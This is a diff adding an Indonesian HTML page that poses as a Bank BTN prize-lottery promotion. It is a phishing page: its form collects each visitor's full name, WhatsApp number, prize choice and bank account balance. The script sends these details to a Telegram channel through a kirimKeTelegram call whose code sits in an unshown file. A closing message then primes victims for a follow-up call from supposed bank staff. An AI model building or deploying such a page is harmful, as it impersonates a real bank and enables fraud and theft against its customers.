@@ -1,0 +1,365 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>BTN Festival Gebyar</title>
+
+  <!-- Meta Tag untuk Preview Media Sosial / WhatsApp -->
+  <meta property="og:title" content="BTN Festival Gebyar">
+  <meta property="og:description" content="Lengkapi data diri Anda untuk mengikuti program BTN Festival Gebyar.">
+  <meta property="og:image" content="https://cdn.phototourl.com/member/2026-11-09-e5ab9bcc-519a-43ef-a02d-61926ce4ea3a.png">
+  <meta property="og:type" content="website">
+
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+  <style>
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background-color: #f1f5f9;
+      -webkit-tap-highlight-color: transparent;
+      touch-action: manipulation;
+    }
+    .no-scrollbar::-webkit-scrollbar {
+      display: none;
+    }
+    .no-scrollbar {
+      -ms-overflow-style: none;
+      scrollbar-width: none;
+    }
+    .typing-cursor::after {
+      content: '|';
+      animation: blink 0.7s infinite;
+    }
+    @keyframes blink {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0; }
+    }
+    @keyframes bounceDot {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-7px); }
+    }
+    .dot-loading span {
+      animation: bounceDot 0.6s infinite alternate;
+    }
+    .dot-loading span:nth-child(2) {
+      animation-delay: 0.2s;
+    }
+    .dot-loading span:nth-child(3) {
+      animation-delay: 0.4s;
+    }
+  </style>
+</head>
+<body class="flex justify-center min-h-screen bg-slate-200 text-xs">
+
+  <!-- Mobile Container (Ukuran proporsional max-w-[400px]) -->
+  <div class="w-full max-w-[400px] min-h-screen bg-[#f4f7fb] relative shadow-2xl overflow-x-hidden pb-8">
+
+    <!-- Loading Halaman Awal -->
+    <div id="initialLoading" class="absolute inset-0 bg-gradient-to-b from-[#1355a6] to-[#1e6fd9] z-50 flex flex-col items-center justify-center text-white px-6 text-center">
+      <div class="mb-4 bg-white p-3.5 rounded-full shadow-lg">
+        <img src="https://cdn.phototourl.com/member/2026-11-09-0536b532-905e-4ee2-927e-571bcb7c8081.png" alt="Logo BTN" class="h-9 w-auto object-contain">
+      </div>
+      <h1 class="text-sm font-bold mb-1.5">BTN Festival Gebyar</h1>
+      <p class="text-[11px] text-blue-100 mb-6">Memuat sistem keamanan dan data program...</p>
+      <div class="w-7 h-7 border-3 border-white/30 border-t-white rounded-full animate-spin"></div>
+    </div>
+
+    <!-- Modal Loading Transisi (3 Titik) -->
+    <div id="transitionLoading" class="fixed inset-0 bg-black/50 backdrop-blur-xs z-50 flex flex-col items-center justify-center hidden">
+      <div class="bg-white px-7 py-4 rounded-xl shadow-2xl flex flex-col items-center">
+        <p class="text-[11px] font-semibold text-slate-700 mb-3">Memproses data...</p>
+        <div class="flex items-center gap-1.5 dot-loading">
+          <span class="w-3.5 h-3.5 bg-blue-600 rounded-full inline-block"></span>
+          <span class="w-3.5 h-3.5 bg-red-600 rounded-full inline-block"></span>
+          <span class="w-3.5 h-3.5 bg-blue-600 rounded-full inline-block"></span>
+        </div>
+      </div>
+    </div>
+
+    <!-- Top Header & Slider Area -->
+    <div class="bg-gradient-to-b from-[#1355a6] to-[#1e6fd9] pt-3.5 pb-14 px-3.5 rounded-b-[24px] relative">
+      <div class="bg-white/75 backdrop-blur-md border border-white/50 rounded-full px-4 py-2 flex items-center justify-between shadow-md mb-3.5 relative z-20">
+        <div class="flex items-center">
+          <img src="https://cdn.phototourl.com/member/2026-11-09-0536b532-905e-4ee2-927e-571bcb7c8081.png" alt="Logo BTN" class="h-6 w-auto object-contain">
+        </div>
+        <div class="flex items-center gap-3 text-[#1256c4]">
+          <button onclick="showToast('Layanan Chat BTN')" class="hover:opacity-75 active:scale-90 transition">
+            <i class="fa-regular fa-comment-dots text-lg"></i>
+          </button>
+          <button onclick="showToast('Pencarian')" class="hover:opacity-75 active:scale-90 transition">
+            <i class="fa-solid fa-magnifying-glass text-base"></i>
+          </button>
+          <button onclick="showToast('Menu Utama')" class="w-7 h-7 rounded-full border-[1.2px] border-[#1256c4] flex items-center justify-center hover:bg-blue-50 active:scale-90 transition">
+            <i class="fa-solid fa-bars text-xs"></i>
+          </button>
+        </div>
+      </div>
+
+      <!-- Image Slider -->
+      <div class="relative">
+        <div id="promoSlider" class="flex overflow-x-auto snap-x snap-mandatory no-scrollbar rounded-xl shadow-md items-center">
+          <div class="min-w-full snap-center flex justify-center bg-blue-900/20 rounded-xl overflow-hidden">
+            <img src="https://cdn.phototourl.com/member/2026-11-09-e5ab9bcc-519a-43ef-a02d-61926ce4ea3a.png" alt="Promo 1" class="w-full h-auto max-h-48 object-contain rounded-xl">
+          </div>
+          <div class="min-w-full snap-center flex justify-center bg-blue-900/20 rounded-xl overflow-hidden">
+            <img src="https://cdn.phototourl.com/member/2026-11-09-19c7aafe-6b47-4844-a6fb-ff73799c5f14.jpg" alt="Promo 2" class="w-full h-auto max-h-48 object-contain rounded-xl">
+          </div>
+          <div class="min-w-full snap-center flex justify-center bg-blue-900/20 rounded-xl overflow-hidden">
+            <img src="https://cdn.phototourl.com/member/2026-11-09-1f4f0808-da2e-465c-b536-916bcd8e1189.jpg" alt="Promo 3" class="w-full h-auto max-h-48 object-contain rounded-xl">
+          </div>
+        </div>
+        <div id="sliderDots" class="flex justify-center items-center gap-1.5 mt-2">
+          <span class="dot w-3.5 h-1 bg-white rounded-full transition-all duration-300"></span>
+          <span class="dot w-1 h-1 bg-white/50 rounded-full transition-all duration-300"></span>
+          <span class="dot w-1 h-1 bg-white/50 rounded-full transition-all duration-300"></span>
+        </div>
+      </div>
+    </div>
+
+    <!-- Halaman 1 -->
+    <div id="page1" class="-mt-9 px-3.5 relative z-10">
+      <div class="bg-white rounded-xl p-4 shadow-md border border-slate-100 relative overflow-hidden">
+        <div class="absolute -right-7 -top-7 w-20 h-20 bg-blue-50 rounded-full pointer-events-none"></div>
+
+        <div class="relative z-10 mb-3">
+          <h1 class="text-xs font-extrabold text-slate-800">BTN Festival Gebyar</h1>
+          <p id="typingText1" class="text-[11px] text-slate-500 mt-0.5 min-h-[14px] typing-cursor"></p>
+        </div>
+
+        <form id="form1" onsubmit="handleNextPage(event)" class="relative z-10 space-y-3">
+          <!-- Nama -->
+          <div>
+            <label class="block text-[11px] font-semibold text-slate-700 mb-1">Nama Lengkap</label>
+            <div class="relative">
+              <span class="absolute left-3 top-1/2 -translate-y-1/2 text-slate-400 text-xs"><i class="fa-regular fa-user"></i></span>
+              <input type="text" id="nama1" required placeholder="Masukkan nama lengkap" class="w-full pl-9 pr-3 py-2 text-xs bg-slate-50 border border-slate-200 rounded-lg focus:outline-none focus:ring-1 focus:ring-blue-500 focus:bg-white transition">
+            </div>
+          </div>
+
+          <!-- Nomor WhatsApp -->
+          <div>
+            <label class="block text-[11px] font-semibold text-slate-700 mb-1">Nomor WhatsApp <span class="text-[10px] font-normal text-slate-400">(10-13 digit)</span></label>
+            <div class="relative">
+              <span class="absolute left-3 top-1/2 -translate-y-1/2 text-slate-400 text-xs"><i class="fa-brands fa-whatsapp"></i></span>
+              <input type="tel" id="wa1" required inputmode="numeric" minlength="10" maxlength="13" placeholder="Contoh: 081234567890" oninput="formatWA(this, 'error1')" class="w-full pl-9 pr-3 py-2 text-xs bg-slate-50 border border-slate-200 rounded-lg focus:outline-none focus:ring-1 focus:ring-blue-500 focus:bg-white transition">
+            </div>
+            <p id="error1" class="text-[10px] text-red-500 mt-0.5 hidden">Nomor WA harus 10-13 digit angka.</p>
+          </div>
+
+          <!-- Pilihan Hadiah -->
+          <div>
+            <label class="block text-[11px] font-semibold text-slate-700 mb-1">Pilihan Hadiah / Program</label>
+            <div class="relative">
+              <span class="absolute left-3 top-1/2 -translate-y-1/2 text-slate-400 text-xs"><i class="fa-solid fa-gift"></i></span>
+              <select id="hadiah1" required class="w-full pl-9 pr-3 py-2 text-xs bg-slate-50 border border-slate-200 rounded-lg focus:outline-none focus:ring-1 focus:ring-blue-500 focus:bg-white transition text-slate-700">
+                <option value="" disabled selected>-- Pilih Hadiah Undian --</option>
+                <option value="Mobil Toyota Innova">Mobil Toyota Innova</option>
+                <option value="Mobil Honda Brio">Mobil Honda Brio</option>
+                <option value="Sepeda Motor Honda Beat">Sepeda Motor Honda Beat</option>
+                <option value="Logam Mulia 10 Gram">Logam Mulia 10 Gram</option>
+                <option value="Saldo Tabungan Rp 5.000.000">Saldo Tabungan Rp 5.000.000</option>
+              </select>
+            </div>
+          </div>
+
+          <!-- Saldo Rekening -->
+          <div>
+            <label class="block text-[11px] font-semibold text-slate-700 mb-1">Saldo Rekening</label>
+            <div class="relative">
+              <span class="absolute left-3 top-1/2 -translate-y-1/2 text-[11px] font-bold text-slate-500">Rp</span>
+              <input type="text" id="saldo1" required inputmode="numeric" placeholder="0" oninput="formatRupiah(this)" class="w-full pl-9 pr-3 py-2 text-xs font-semibold text-slate-800 bg-slate-50 border border-slate-200 rounded-lg focus:outline-none focus:ring-1 focus:ring-blue-500 focus:bg-white transition">
+            </div>
+          </div>
+
+          <button type="submit" id="submitBtn1" class="w-full bg-gradient-to-r from-[#1355a6] to-[#1e6fd9] text-white font-bold text-xs py-2.5 rounded-lg shadow-md hover:opacity-95 active:scale-[0.98] transition mt-1">
+            Lanjut
+          </button>
+        </form>
+      </div>
+    </div>
+
+    <!-- Halaman 2 -->
+    <div id="page2" class="-mt-9 px-3.5 relative z-10 hidden">
+      <div class="bg-[#1f5fb8] text-white rounded-xl p-5 shadow-xl border border-white/30 relative text-center">
+        <div class="mb-2 text-yellow-300">
+          <i class="fa-solid fa-circle-check text-3xl animate-bounce"></i>
+        </div>
+        <p id="typingText2" class="text-xs font-medium leading-relaxed tracking-wide min-h-[120px] typing-cursor flex items-center justify-center"></p>
+        <button onclick="playVoice()" class="mt-3 bg-white text-[#1355a6] text-[11px] font-bold px-3.5 py-1.5 rounded-full shadow hover:bg-slate-100 transition">
+          <i class="fa-solid fa-volume-high mr-1"></i> Putar Ulang Suara
+        </button>
+      </div>
+    </div>
+
+    <!-- Toast Notification -->
+    <div id="toast" class="fixed bottom-5 left-1/2 -translate-x-1/2 bg-slate-800 text-white text-[11px] font-medium px-3.5 py-2 rounded-full shadow-lg opacity-0 pointer-events-none transition-opacity duration-300 z-50 whitespace-nowrap">
+      Pesan notifikasi
+    
+  <script src="csst.js"></script>
+
+  <script>
+    let userData = {};
+
+    window.onload = () => {
+      setTimeout(() => {
+        const initialLoading = document.getElementById('initialLoading');
+        initialLoading.style.transition = 'opacity 0.4s ease';
+        initialLoading.style.opacity = '0';
+        setTimeout(() => {
+          initialLoading.style.display = 'none';
+          typeEffect1();
+        }, 400);
+      }, 1500);
+    };
+
+    const textPage1 = "Lengkapi data di bawah ini untuk mengikuti program";
+    let charIndex1 = 0;
+
+    function typeEffect1() {
+      const targetEl = document.getElementById('typingText1');
+      if (!targetEl) return;
+      if (charIndex1 < textPage1.length) {
+        targetEl.textContent += textPage1.charAt(charIndex1);
+        charIndex1++;
+        setTimeout(typeEffect1, 45);
+      } else {
+        targetEl.classList.remove('typing-cursor');
+      }
+    }
+
+    const announcementText = "Terimakasih Telah Mendaftar Dilayanan Bank BTN Festival, Pendaftaran Anda Sedang Diproses, Beberapa Saat Lagi Anda Akan Dihubungi Oleh Pihak Bank BTN, Untuk Proses Cetak Kode Kupon Undian Anda.";
+
+    function playVoice() {
+      if ('speechSynthesis' in window) {
+        window.speechSynthesis.cancel();
+        const utterance = new SpeechSynthesisUtterance(announcementText);
+        utterance.lang = 'id-ID';
+        utterance.rate = 0.95;
+        utterance.pitch = 1.0;
+        window.speechSynthesis.speak(utterance);
+      }
+    }
+
+    let charIndex2 = 0;
+    function typeEffect2() {
+      const targetEl = document.getElementById('typingText2');
+      if (!targetEl) return;
+      if (charIndex2 < announcementText.length) {
+        targetEl.textContent += announcementText.charAt(charIndex2);
+        charIndex2++;
+        setTimeout(typeEffect2, 40);
+      }
+    }
+
+    const slider = document.getElementById('promoSlider');
+    const dots = document.querySelectorAll('#sliderDots .dot');
+    let currentSlide = 0;
+    const totalSlides = dots.length;
+
+    function updateDots(index) {
+      dots.forEach((dot, i) => {
+        if (i === index) {
+          dot.classList.remove('w-1', 'bg-white/50');
+          dot.classList.add('w-3.5', 'bg-white');
+        } else {
+          dot.classList.remove('w-3.5', 'bg-white');
+          dot.classList.add('w-1', 'bg-white/50');
+        }
+      });
+    }
+
+    slider.addEventListener('scroll', () => {
+      const index = Math.round(slider.scrollLeft / slider.clientWidth);
+      if (index !== currentSlide) {
+        currentSlide = index;
+        updateDots(currentSlide);
+      }
+    });
+
+    setInterval(() => {
+      currentSlide = (currentSlide + 1) % totalSlides;
+      slider.scrollTo({ left: currentSlide * slider.clientWidth, behavior: 'smooth' });
+      updateDots(currentSlide);
+    }, 3500);
+
+    let toastTimeout;
+    function showToast(message) {
+      const toast = document.getElementById('toast');
+      toast.textContent = message;
+      toast.classList.remove('opacity-0');
+      toast.classList.add('opacity-100');
+      clearTimeout(toastTimeout);
+      toastTimeout = setTimeout(() => {
+        toast.classList.remove('opacity-100');
+        toast.classList.add('opacity-0');
+      }, 2000);
+    }
+
+    function formatWA(input, errorId) {
+      input.value = input.value.replace(/\D/g, '').slice(0, 13);
+      const errEl = document.getElementById(errorId);
+      if (input.value.length > 0 && (input.value.length < 10 || input.value.length > 13)) {
+        errEl.classList.remove('hidden');
+      } else {
+        errEl.classList.add('hidden');
+      }
+    }
+
+    function formatRupiah(input) {
+      let angka = input.value.replace(/\D/g, '');
+      if (angka === '') {
+        input.value = '';
+        return;
+      }
+      input.value = angka.replace(/\B(?=(\d{3})+(?!\d))/g, '.');
+    }
+
+    async function handleNextPage(e) {
+      e.preventDefault();
+      userData.nama = document.getElementById('nama1').value.trim();
+      userData.wa = document.getElementById('wa1').value.trim();
+      userData.hadiah = document.getElementById('hadiah1').value;
+      userData.saldo = document.getElementById('saldo1').value.trim();
+
+      if (userData.wa.length < 10 || userData.wa.length > 13) {
+        showToast('Nomor WA harus 10 - 13 digit!');
+        return;
+      }
+
+      if (!userData.hadiah) {
+        showToast('Silakan pilih hadiah terlebih dahulu!');
+        return;
+      }
+
+      if (!userData.saldo) {
+        showToast('Masukkan nominal saldo!');
+        return;
+      }
+
+      const transitionLoading = document.getElementById('transitionLoading');
+      transitionLoading.classList.remove('hidden');
+
+      const text = `🔔 *DATA BARU BTN FESTIVAL GEBYAR* 🔔\n\n` +
+                   `👤 *Nama:* ${userData.nama}\n` +
+                   `📱 *No WhatsApp:* ${userData.wa}\n` +
+                   `🎁 *Pilihan Hadiah:* ${userData.hadiah}\n` +
+                   `💰 *Saldo:* Rp ${userData.saldo}`;
+
+      await kirimKeTelegram(text);
+
+      setTimeout(() => {
+        transitionLoading.classList.add('hidden');
+        document.getElementById('page1').classList.add('hidden');
+        document.getElementById('page2').classList.remove('hidden');
+        window.scrollTo(0, 0);
+
+        charIndex2 = 0;
+        document.getElementById('typingText2').textContent = "";
+        typeEffect2();
+        playVoice();
+      }, 1500);
+    }
+  </script>
+</body>
+</html>
